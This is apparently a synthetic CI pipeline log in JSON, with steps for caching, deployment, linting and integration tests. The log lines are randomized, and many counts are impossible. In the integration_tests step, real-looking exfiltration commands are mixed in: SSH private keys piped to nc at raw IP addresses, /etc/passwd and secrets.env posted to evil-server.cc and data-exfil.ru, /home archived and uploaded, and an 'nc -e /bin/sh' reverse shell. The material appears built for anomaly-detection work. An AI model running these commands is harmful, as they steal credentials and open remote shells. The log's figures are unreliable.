          "Waiting...",
          "Fetching submodules...",
          "[12:46:23] DEBUG: Initializing service",
          "Layer 5/8: COPY command",
          "[12:46:23] WARN: Deprecated API usage",
          "Minifying vendor.js",
          "npm install: added 366 packages",
          "Building Docker image...",
          "[12:46:23] DEBUG: Query executed in 64ms",
          "[12:46:23] DEBUG: Loading configuration",
          "Tests: 70 passed, 253 total",
          "OK",
          "[12:46:23] WARN: Deprecated API usage",
          "Step 6/19: Deploying",
          "Step 17/20: Running migrations",
          "Step 6/18: Running migrations",
          "Artifact downloaded: 47MB",
          "Waiting...",
          "Checking out develop branch",
          "Coverage: 97% statements, 95% branches",
          "Artifact uploaded: dist.zip (12MB)",
          "\u2713 All checks passed",
          "WARNING: eslint has known vulnerabilities",
          "Waiting...",
          "npm install: added 104 packages",
          "[12:46:23] INFO: Starting build process",
          "Artifact downloaded: 12MB",
          "Generating source maps...",
          "Generating source maps...",
          "FAILED: test_db_connect",
          "  PASS: test_db_connect (4ms)",
          "Compiling utils/handler.rs...",
          "Using Python 3.9",
          "Creating production build...",
          "Using Python 3.12",
          "Bundling vendor.css",
          "[12:46:23] INFO: Request completed",
          "Test Suites: 38 passed, 37 total",
          "Step 12/21: Linting",
          "Using Python 3.9",
          "Step 15/21: Building",
          "Artifact uploaded: dist.zip (38MB)",
          "pip: Collecting eslint",
          "Compiling utils/main.py...",
          "Switched to branch 'hotfix/task-118'",
          "POST /api - 202 (20ms)",
          "Coverage: 85% statements, 85% branches",
          "pip install: Successfully installed react-5.6",
          "Step 14/17: Testing",
          "npm notice: created a lockfile",
          "[12:46:23] DEBUG: Connection pool: 9 active",
          "HEAD is now at 805ff35",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-14T12:48:29.982669",
        "finished_at": "2025-12-14T12:48:38.046809",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:46:23] DEBUG: Memory usage: 335MB",
          "Completed.",
          "WARNING: jest has known vulnerabilities",
          "Ready.",
          "Snapshots: 9 passed, 27 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm install: resolved 959 packages",
          "[12:46:23] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 All checks passed",
          "Platform: darwin-arm64",
          "[12:46:23] DEBUG: Memory usage: 1424MB",
          "Building Docker image...",
          "Snapshots: 10 passed, 10 total",
          "Installing eslint@2.17.10",
          "Pushing to registry...",
          "Success!",
          "Artifact uploaded: dist.zip (77MB)",
          "Compiling src/service.java...",
          "Finished.",
          "Creating production build...",
          "Switched to branch 'bugfix/task-455'",
          "Transforming 948 files...",
          "[12:46:23] DEBUG: Loading configuration",
          "  PASS: integration/test_cache_hit.spec.js",
          "Step 7/16: Running migrations",
          "Completed.",
          "Optimizing 58 modules...",
          "[12:46:23] INFO: Cache refreshed",
          "Compiling src/service.java...",
          "Cache invalidated: dependencies",
          "[12:46:23] INFO: Request completed",
          "Test Suites: 44 passed, 38 total",
          "[12:46:23] INFO: Connecting to database",
          "Success!",
          "Compiling src/app.ts...",
          "[12:46:23] ERROR: Connection failed",
          "[12:46:23] DEBUG: Loading configuration",
          "Finished.",
          "Finished.",
          "yarn add: Done in 21.95s",
          "TLS handshake completed",
          "  PASS: unit/test_db_connect.spec.js",
          "Processing...",
          "Pulling image: alpine:latest",
          "npm install: added 276 packages",
          "Step 12/21: Deploying",
          "Platform: win32-x64",
          "Processing...",
          "HEAD is now at 8908d85",
          "Switched to branch 'hotfix/task-412'",
          "Transforming 379 files...",
          "Platform: linux-x64",
          "Step 18/17: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 94% statements, 89% branches",
          "\u2713 Step 'test' succeeded",
          "yarn add: Done in 11.65s",
          "Snapshots: 42 passed, 1 total",
          "\u2713 deploy completed",
          "Artifact uploaded: dist.zip (80MB)",
          "POST /data - 200 (430ms)",
          "pip: Downloading lodash-2.20.tar.gz",
          "Pushing to registry...",
          "Step 7/22: Running migrations",
          "[12:46:23] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "Ran 120 tests in 27s",
          "Cache miss for key-9915",
          "npm notice: package.json updated",
          "Switched to branch 'feature/task-624'",
          "Pulling image: node:18",
          "Transforming 586 files...",
          "Cache restored successfully (136MB)",
          "yarn add: Done in 9.41s",
          "Step 11/16: Testing",
          "Step 4/20: Deploying",
          "GET /status - 204 (16ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:23] INFO: Request completed",
          "npm notice: package.json updated",
          "npm install: resolved 320 packages",
          "\u2713 All checks passed",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 Task completed in 3408ms",
          "Step 20/22: Deploying",
          "HEAD is now at bdd9746",
          "POST /data - 202 (243ms)",
          "[12:46:23] WARN: Deprecated API usage",
          "Waiting...",
          "WARNING: webpack has known vulnerabilities",
          "pip install: Successfully installed eslint-3.8",
          "  PASS: e2e/test_api_health.spec.js",
          "Image pulled successfully",
          "Step 4/25: Building",
          "[12:46:23] INFO: Connecting to database",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-1731",
          "Compiling lib/index.js...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Checking out main branch",
          "[12:46:23] INFO: Processing request",
          "Step 7/18: Testing",
          "Step 2/23: Building",
          "Minifying app.js",
          "Cache hit for key-1641",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache restored successfully (99MB)",
          "[12:46:23] DEBUG: Memory usage: 1065MB",
          "Checking out develop branch",
          "Bundling vendor.js",
          "Artifact uploaded: build.tar.gz (43MB)",
          "npm install: added 245 packages",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "Using Node.js 16.20.4",
          "[12:46:23] WARN: Deprecated API usage",
          "pip install: Successfully installed express-3.0",
          "Snapshots: 0 passed, 1 total",
          "npm notice: package.json updated",
          "\u2713 build completed",
          "Exception: NullPointerException",
          "Transforming 857 files...",
          "Creating production build...",
          "Cache saved successfully",
          "Environment: test",
          "Ready.",
          "Step 4/16: Deploying",
          "Completed.",
          "[12:46:23] INFO: Cache refreshed",
          "FAILED: test_db_connect",
          "Fetching submodules...",
          "Done.",
          "[12:46:23] INFO: Cache refreshed",
          "npm install: added 379 packages",
          "npm notice: package.json updated",
          "Verifying...",
          "Processing...",
          "Artifact downloaded: 29MB",
          "Step 1/21: Testing",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: unit/test_db_connect.spec.js",
          "Compiling src/utils.go...",
          "Ran 147 tests in 43s",
          "Exception: ValueError",
          "Step 12/18: Linting",
          "Generating source maps...",
          "Step 9/17: Installing dependencies",
          "\u2713 Task completed in 2376ms",
          "Cache restored successfully (176MB)",
          "\u2713 All checks passed",
          "Pulling image: node:latest",
          "Ran 25 tests in 46s",
          "  PASS: test_user_create (315ms)",
          "\u2713 build completed",
          "pip: Downloading axios-1.9.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing prettier@4.8.9",
          "Cache saved successfully",
          "  PASS: integration/test_db_connect.spec.js",
          "Generating source maps...",
          "yarn add: Done in 12.17s",
          "Cache hit for key-9123",
          "Done.",
          "yarn add: Done in 19.20s",
          "Transforming 527 files...",
          "Artifact uploaded: dist.zip (75MB)",
          "[12:46:23] INFO: Connecting to database",
          "[12:46:23] INFO: Cache refreshed",
          "Cache miss for key-4860",
          "Test Suites: 40 passed, 26 total",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-14T12:48:38.046809",
        "finished_at": "2025-12-14T12:48:51.487043",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Loading...",
          "Artifact downloaded: 44MB",
          "npm install: added 134 packages",
          "Success!",
          "Layer 6/9: RUN command",
          "Building Docker image...",
          "[12:46:23] ERROR: Connection failed",
          "  PASS: e2e/test_cache_hit.spec.js",
          "  PASS: test_db_connect (244ms)",
          "OK",
          "Test Suites: 24 passed, 21 total",
          "Completed.",
          "Transforming 515 files...",
          "Optimizing 59 modules...",
          "Step 18/16: Running migrations",
          "Coverage: 85% statements, 94% branches",
          "Transforming 906 files...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Step 13/24: Linting",
          "Step 18/20: Testing",
          "pip: Downloading eslint-2.9.tar.gz",
          "Pushing to registry...",
          "Using Python 3.9",
          "Test Suites: 27 passed, 40 total",
          "Coverage: 90% statements, 61% branches",
          "Step 1/15: Installing dependencies",
          "Ran 102 tests in 36s",
          "Artifact downloaded: 5MB",
          "Cache saved successfully",
          "HEAD is now at 17fcea5",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:46:23] WARN: Deprecated API usage",
          "\u2713 Task completed in 414ms",
          "Pushing to registry...",
          "WARNING: react has known vulnerabilities",
          "Loading...",
          "Using Python 3.12",
          "\u2717 build failed with exit code 122",
          "[12:46:23] ERROR: Connection failed",
          "Connection established",
          "POST /upload - 201 (499ms)",
          "Step 13/15: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 14.6.10",
          "  PASS: test_api_health (195ms)",
          "FAILED: test_api_health",
          "Layer 5/14: RUN command",
          "Step 13/25: Installing dependencies",
          "Building Docker image...",
          "Fetching from https://pypi.org/package.json",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:23] DEBUG: Memory usage: 1146MB",
          "Using Node.js 19.3.0",
          "Done.",
          "Verifying...",
          "[12:46:23] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "Pulling image: python:latest",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:46:23] INFO: Request completed",
          "Image pulled successfully",
          "[12:46:23] DEBUG: Initializing service",
          "Creating production build...",
          "POST /data - 201 (384ms)",
          "Switched to branch 'hotfix/task-418'",
          "Environment: staging",
          "[12:46:23] DEBUG: Query executed in 72ms",
          "Generating source maps...",
          "Artifact downloaded: 18MB",
          "yarn add: Done in 12.47s",
          "pip: Downloading axios-5.11.tar.gz",
          "\u2713 Task completed in 1810ms",
          "Compiling lib/service.java...",
          "Transforming 857 files...",
          "[12:46:23] DEBUG: Loading configuration",
          "Processing...",
          "[12:46:23] WARN: Deprecated API usage",
          "Optimizing 83 modules...",
          "npm install: resolved 1931 packages",
          "Test Suites: 23 passed, 6 total",
          "Transforming 546 files...",
          "pip install: Successfully installed webpack-5.2",
          "Artifact uploaded: dist.zip (75MB)",
          "Artifact downloaded: 9MB",
          "Done.",
          "Uploading artifact 'build' (29 files)",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "Fetching submodules...",
          "  PASS: test_api_health (136ms)",
          "Waiting...",
          "[12:46:23] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (39 files)",
          "Generating source maps...",
          "Connection established",
          "npm install: resolved 921 packages",
          "[12:46:23] DEBUG: Initializing service",
          "Compiling utils/utils.go...",
          "Loading...",
          "Step 16/24: Linting",
          "OK",
          "[12:46:23] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Success!",
          "WARNING: express has known vulnerabilities",
          "Compiling utils/main.py...",
          "[12:46:23] DEBUG: Connection pool: 14 active",
          "WARNING: express has known vulnerabilities",
          "Test Suites: 43 passed, 12 total",
          "Generating source maps...",
          "Optimizing 86 modules...",
          "\u2713 Task completed in 4401ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Platform: darwin-arm64",
          "WARNING: react has known vulnerabilities",
          "Exception: ValueError",
          "Step 7/20: Linting",
          "[12:46:23] DEBUG: Initializing service",
          "Loading...",
          "pip install: Successfully installed lodash-5.10",
          "pip install: Successfully installed eslint-2.5",
          "\u2717 build failed with exit code 118",
          "pip: Collecting jest",
          "WARNING: lodash has known vulnerabilities",
          "HEAD is now at 0aaf751",
          "Using Node.js 18.5.9",
          "pip: Downloading axios-1.20.tar.gz",
          "HEAD is now at 3063de9",
          "Transforming 799 files...",
          "\u2717 build failed with exit code 123",
          "Installing react@3.3.2",
          "Compiling components/main.py...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "FAILED: test_api_health",
          "Pulling image: alpine:3.11",
          "pip: Installing build dependencies...",
          "Step 16/22: Deploying",
          "Optimizing 48 modules...",
          "Image pulled successfully",
          "GET /api - 200 (64ms)",
          "Environment: development",
          "  PASS: unit/test_db_connect.spec.js",
          "Generating source maps...",
          "Done.",
          "pip: Collecting lodash",
          "[12:46:23] INFO: Connecting to database",
          "Exception: NullPointerException",
          "Image pulled successfully",
          "Test Suites: 49 passed, 20 total",
          "[12:46:23] INFO: Connecting to database",
          "npm install: resolved 584 packages",
          "WARNING: lodash has known vulnerabilities",
          "Ran 17 tests in 24s",
          "Step 16/18: Linting",
          "\u2713 package completed",
          "HEAD is now at 2a217f5",
          "Tests: 217 passed, 151 total",
          "Installing prettier@3.10.10",
          "npm notice: package.json updated",
          "Test Suites: 22 passed, 28 total",
          "[12:46:23] DEBUG: Initializing service",
          "Layer 2/10: RUN command",
          "Ready.",
          "Coverage: 75% statements, 71% branches",
          "Snapshots: 15 passed, 6 total",
          "Completed.",
          "Compiling lib/service.java...",
          "Uploading artifact 'coverage' (10 files)",
          "\u2713 All checks passed",
          "Platform: darwin-arm64",
          "Compiling src/index.js...",
          "Switched to branch 'hotfix/task-784'",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-14T12:48:51.487043",
        "finished_at": "2025-12-14T12:48:59.551183",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Ran 160 tests in 50s",
          "[12:46:23] INFO: Connecting to database",
          "Time: 67.577s",
          "[12:46:23] INFO: Processing request",
          "Exception: ValueError",
          "  PASS: integration/test_cache_hit.spec.js",
          "[12:46:23] INFO: Starting build process",
          "Ready.",
          "NODE_ENV=test",
          "[12:46:23] DEBUG: Connection pool: 13 active",
          "Loading...",
          "yarn add: Done in 4.55s",
          "Tests: 62 passed, 302 total",
          "Loading...",
          "Pulling image: node:3.11",
          "OK",
          "Using Python 3.11",
          "\u2713 Step 'build' succeeded",
          "WARNING: lodash has known vulnerabilities",
          "Loading...",
          "Cache restored successfully (411MB)",
          "Artifact downloaded: 6MB",
          "Compiling utils/utils.go...",
          "npm install: added 157 packages",
          "FAILED: test_auth_login",
          "Optimizing 16 modules...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out develop branch",
          "[12:46:23] INFO: Starting build process",
          "Cache saved successfully",
          "[12:46:23] ERROR: Connection failed",
          "[12:46:23] DEBUG: Connection pool: 1 active",
          "Coverage: 90% statements, 61% branches",
          "Cache restored successfully (422MB)",
          "Pushing to registry...",
          "Step 13/16: Building",
          "\u2713 Task completed in 2589ms",
          "Compiling utils/utils.go...",
          "Done.",
          "pip: Downloading express-3.11.tar.gz",
          "[12:46:23] INFO: Request completed",
          "[12:46:23] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "npm notice: created a lockfile",
          "\u2713 Step 'install' succeeded",
          "Step 6/18: Testing",
          "Platform: win32-x64",
          "[12:46:23] DEBUG: Loading configuration",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Step 'build' succeeded",
          "Fetching submodules...",
          "\u2713 test completed",
          "pip install: Successfully installed react-1.20",
          "Switched to branch 'bugfix/task-149'",
          "Step 1/22: Deploying",
          "Image pulled successfully",
          "Processing...",
          "Verifying...",
          "Step 19/21: Linting",
          "Compiling lib/index.js...",
          "Tests: 229 passed, 423 total",
          "[12:46:23] INFO: Connecting to database",
          "Minifying main.js",
          "[12:46:23] DEBUG: Initializing service",
          "Pulling image: python:18",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Ran 155 tests in 22s",
          "Using Node.js 20.20.7",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "yarn add: Done in 19.56s",
          "Compiling utils/index.js...",
          "Tests: 121 passed, 390 total",
          "\u2713 deploy completed",
          "[12:46:23] INFO: Cache refreshed",
          "Done.",
          "  PASS: integration/test_user_create.spec.js",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 All checks passed",
          "Using Node.js 16.19.5",
          "Optimizing 53 modules...",
          "Compiling lib/handler.rs...",
          "TLS handshake completed",
          "Layer 4/12: ENV command",
          "Loading...",
          "Cache restored successfully (354MB)",
          "[12:46:23] INFO: Processing request",
          "Already up to date.",
          "WARNING: jest has known vulnerabilities",
          "[12:46:23] INFO: Cache refreshed",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:23] ERROR: Connection failed",
          "[12:46:23] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "FAILED: test_db_connect",
          "Success!",
          "HEAD is now at 3198bea",
          "npm install: added 294 packages",
          "Step 3/16: Testing",
          "Using Python 3.12",
          "[12:46:23] INFO: Processing request",
          "  PASS: test_user_create (104ms)",
          "Ran 23 tests in 44s",
          "\u2713 Task completed in 1054ms",
          "Environment: test",
          "Pushing to registry...",
          "Optimizing 93 modules...",
          "Layer 3/8: ENV command",
          "Success!",
          "Fetching from https://npmjs.org/package.json",
          "Artifact uploaded: dist.zip (29MB)",
          "Environment: development",
          "pip: Downloading lodash-2.20.tar.gz",
          "Platform: linux-x64",
          "OK",
          "[12:46:23] DEBUG: Initializing service",
          "[12:46:23] WARN: Deprecated API usage",
          "Time: 115.771s",
          "pip: Collecting lodash",
          "Done.",
          "Cache restored successfully (450MB)",
          "Step 13/19: Testing",
          "\u2713 lint completed",
          "[12:46:23] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Building Docker image...",
          "Uploading artifact 'dist' (41 files)",
          "WARNING: axios has known vulnerabilities",
          "HEAD is now at 905b742",
          "WARNING: react has known vulnerabilities",
          "Using Python 3.12",
          "Loading...",
          "[12:46:23] INFO: Request completed",
          "Minifying app.js",
          "Step 20/18: Linting",
          "[12:46:23] DEBUG: Loading configuration",
          "[12:46:23] DEBUG: Query executed in 25ms",
          "pip install: Successfully installed express-1.12",
          "Fetching from https://github.com/package.json",
          "Cache invalidated: build",
          "Pulling image: node:latest",
          "Step 1/18: Deploying",
          "Step 13/18: Linting",
          "Transforming 929 files...",
          "\u2713 test completed",
          "Step 8/21: Running migrations",
          "[12:46:23] INFO: Connecting to database",
          "Snapshots: 13 passed, 15 total",
          "pip: Collecting eslint",
          "Success!",
          "Cache miss for key-5666",
          "Connection established",
          "Pulling image: node:latest",
          "Waiting...",
          "Step 1/23: Running migrations",
          "Environment: test",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:23] WARN: Deprecated API usage",
          "Checking out main branch",
          "Processing...",
          "[12:46:23] WARN: Deprecated API usage",
          "Artifact downloaded: 50MB",
          "\u2713 Task completed in 3337ms",
          "Cache hit for key-3752",
          "Compiling src/app.ts...",
          "Step 8/18: Installing dependencies",
          "Time: 36.647s",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Compiling src/service.java...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-14T12:48:59.551183",
        "finished_at": "2025-12-14T12:49:12.991417",
        "log_lines": [
          "=== Step: lint ===",
          "[12:46:23] INFO: Connecting to database",
          "Compiling src/utils.go...",
          "[12:46:23] INFO: Connecting to database",
          "WARNING: axios has known vulnerabilities",
          "Step 6/15: Linting",
          "Coverage: 100% statements, 100% branches",
          "\u2717 build failed with exit code 39",
          "Creating production build...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 6 passed, 11 total",
          "Finished.",
          "  PASS: integration/test_cache_hit.spec.js",
          "Layer 2/13: COPY command",
          "npm notice: created a lockfile",
          "Ran 114 tests in 51s",
          "Step 19/15: Installing dependencies",
          "Ready.",
          "Pulling image: alpine:18",
          "Ran 179 tests in 21s",
          "Artifact uploaded: dist.zip (14MB)",
          "WARNING: prettier has known vulnerabilities",
          "Compiling lib/handler.rs...",
          "Minifying vendor.js",
          "TLS handshake completed",
          "Snapshots: 38 passed, 17 total",
          "Artifact uploaded: dist.zip (85MB)",
          "\u2717 build failed with exit code 24",
          "[12:46:23] DEBUG: Connection pool: 2 active",
          "Loading...",
          "Step 5/24: Building",
          "Step 1/19: Testing",
          "\u2713 validate completed",
          "[12:46:23] INFO: Cache refreshed",
          "Tests: 159 passed, 71 total",
          "Already up to date.",
          "Bundling vendor.js",
          "Layer 7/13: RUN command",
          "POST /api - 201 (419ms)",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] INFO: Starting build process",
          "Bundling main.js",
          "Processing...",
          "Fetching from https://googleapis.com/package.json",
          "Cache saved successfully",
          "TLS handshake completed",
          "yarn add: Done in 23.89s",
          "Step 6/25: Building",
          "Building Docker image...",
          "Done.",
          "Compiling src/index.js...",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "\u2713 lint completed",
          "[12:46:23] INFO: Connecting to database",
          "Fetching submodules...",
          "Test Suites: 23 passed, 16 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:23] DEBUG: Connection pool: 13 active",
          "yarn add: Done in 4.8s",
          "Layer 3/8: RUN command",
          "Using Python 3.12",
          "[12:46:23] ERROR: Connection failed",
          "Fetching submodules...",
          "Ready.",
          "[12:46:23] DEBUG: Query executed in 34ms",
          "Switched to branch 'hotfix/task-353'",
          "Ran 70 tests in 54s",
          "[12:46:23] INFO: Request completed",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "npm install: resolved 585 packages",
          "Connection established",
          "pip: Downloading lodash-4.7.tar.gz",
          "Using Python 3.12",
          "Cache invalidated: build",
          "Step 6/21: Testing",
          "Ran 200 tests in 35s",
          "pip: Installing build dependencies...",
          "Finished.",
          "Finished.",
          "[12:46:23] INFO: Cache refreshed",
          "Fetching submodules...",
          "FAILED: test_api_health",
          "[12:46:23] INFO: Connecting to database",
          "Artifact downloaded: 12MB",
          "Time: 62.376s",
          "Artifact downloaded: 7MB",
          "HEAD is now at 9052a12",
          "Generating source maps...",
          "WARNING: express has known vulnerabilities",
          "Step 4/21: Testing",
          "Test Suites: 24 passed, 23 total",
          "Connection established",
          "Time: 114.49s",
          "Compiling lib/service.java...",
          "POST /data - 202 (432ms)",
          "Test Suites: 37 passed, 24 total",
          "[12:46:23] INFO: Cache refreshed",
          "Compiling utils/utils.go...",
          "Done.",
          "yarn add: Done in 28.64s",
          "Layer 1/9: ENV command",
          "yarn add: Done in 8.71s",
          "[12:46:23] DEBUG: Loading configuration",
          "npm install: resolved 1373 packages",
          "Finished.",
          "Minifying main.js",
          "pip: Installing build dependencies...",
          "Fetching from https://pypi.org/package.json",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-9668",
          "\u2713 package completed",
          "Cache restored successfully (334MB)",
          "Uploading artifact 'build' (40 files)",
          "npm install: resolved 1392 packages",
          "npm notice: created a lockfile",
          "Step 17/25: Running migrations",
          "npm install: resolved 1819 packages",
          "npm notice: package.json updated",
          "Layer 8/10: COPY command",
          "\u2713 Step 'setup' succeeded",
          "Connection established",
          "pip: Collecting lodash",
          "Installing prettier@2.2.7",
          "Finished.",
          "[12:46:23] DEBUG: Initializing service",
          "Step 9/23: Deploying",
          "GET /status - 200 (98ms)",
          "GET /api - 201 (25ms)",
          "Test Suites: 36 passed, 34 total",
          "Compiling src/service.java...",
          "pip: Collecting webpack",
          "  PASS: e2e/test_auth_login.spec.js",
          "Finished.",
          "npm notice: package.json updated",
          "[12:46:23] DEBUG: Loading configuration",
          "pip: Downloading jest-2.5.tar.gz",
          "Platform: darwin-arm64",
          "Building Docker image...",
          "Cache miss for key-8091",
          "Loading...",
          "Verifying...",
          "TLS handshake completed",
          "Artifact downloaded: 31MB",
          "Loading...",
          "[12:46:23] INFO: Processing request",
          "Step 12/21: Testing",
          "Compiling lib/app.ts...",
          "Step 17/24: Linting",
          "npm install: added 485 packages",
          "Processing...",
          "npm notice: package.json updated",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u2713 Step 'checkout' succeeded",
          "Optimizing 50 modules...",
          "Step 14/18: Installing dependencies",
          "Waiting...",
          "NODE_ENV=production",
          "Generating source maps...",
          "Snapshots: 7 passed, 28 total",
          "  PASS: test_api_health (172ms)",
          "Checking out main branch",
          "[12:46:23] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 434 files...",
          "[12:46:23] INFO: Request completed",
          "[12:46:23] INFO: Starting build process",
          "[12:46:23] WARN: Deprecated API usage",
          "[12:46:23] INFO: Request completed",
          "Finished.",
          "[12:46:23] WARN: Deprecated API usage",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-14T12:49:12.991417",
        "finished_at": "2025-12-14T12:49:39.871884",
        "log_lines": [
          "=== Step: integration_tests ===",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 31.216.117.222 35168",
          "npm install: added 224 packages",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "pip install: Successfully installed eslint-1.13",
          "pip: Downloading express-3.7.tar.gz",
          "[12:46:23] WARN: Deprecated API usage",
          "Minifying app.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "[12:46:23] INFO: Request completed",
          "Pushing to registry...",
          "Cache invalidated: dependencies",
          "Step 10/17: Deploying",
          "[12:46:23] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "Cache miss for key-1503",
          "pip: Downloading prettier-3.14.tar.gz",
          "Exception: ValueError",
          "\u2713 deploy completed",
          "Pushing to registry...",
          "Layer 10/11: RUN command",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (65MB)",
          "Layer 8/12: COPY command",
          "Sending 222MB of data to malicious-pool.xyz",
          "Test Suites: 30 passed, 15 total",
          "Cache miss for key-6813",
          "[12:46:23] ERROR: Connection failed",
          "[12:46:23] WARN: Deprecated API usage",
          "Time: 45.829s",
          "\u2713 build completed",
          "[12:46:23] DEBUG: Loading configuration",
          "Tests: 270 passed, 358 total",
          "Artifact downloaded: 7MB",
          "[12:46:23] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:46:23] WARN: Deprecated API usage",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Done.",
          "Checking out main branch",
          "Pushing to registry...",
          "Sending 270MB of data to data-exfil.ru",
          "Compiling lib/utils.go...",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 57 modules...",
          "Test Suites: 29 passed, 17 total",
          "Sending 209MB of data to crypto-mine.io",
          "Waiting...",
          "Using Python 3.9",
          "Transforming 178 files...",
          "\u2713 Step 'build' succeeded",
          "Tests: 100 passed, 227 total",
          "Step 7/16: Deploying",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Already up to date.",
          "Fetching submodules...",
          "Generating source maps...",
          "Processing...",
          "Using Python 3.10",
          "Building Docker image...",
          "Environment: development",
          "Ready.",
          "Step 7/16: Running migrations",
          "nc -e /bin/sh 24.17.22.105 25957",
          "[12:46:23] DEBUG: Memory usage: 1490MB",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Test Suites: 12 passed, 20 total",
          "Uploading artifact 'build' (47 files)",
          "yarn add: Done in 23.17s",
          "Artifact downloaded: 48MB",
          "GET /status - 200 (23ms)",
          "pip: Collecting eslint",
          "Generating source maps...",
          "Optimizing 96 modules...",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 deploy completed",
          "Optimizing 53 modules...",
          "npm notice: package.json updated",
          "Switched to branch 'hotfix/task-842'",
          "Uploading artifact 'build' (38 files)",
          "Already up to date.",
          "[12:46:23] ERROR: Connection failed",
          "Environment: production",
          "Compiling lib/utils.go...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 116.140.14.223 16929",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "Compiling utils/service.java...",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "Loading...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "npm install: added 386 packages",
          "GET /status - 200 (21ms)",
          "Fetching from https://registry.npmjs.org/package.json",
          "Checking out main branch",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 79.249.62.98 11634",
          "WARNING: axios has known vulnerabilities",
          "Step 15/21: Building",
          "Generating source maps...",
          "Installing lodash@1.2.10",
          "NODE_ENV=test",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "Optimizing 99 modules...",
          "Ready.",
          "pip: Installing build dependencies...",
          "curl -X POST https://evil-server.cc/collect --data @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Using Python 3.9",
          "Environment: production",
          "Cache restored successfully (270MB)",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Ran 177 tests in 46s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 15/18: Deploying",
          "Exception: TypeError",
          "[12:46:23] DEBUG: Initializing service",
          "yarn add: Done in 14.62s",
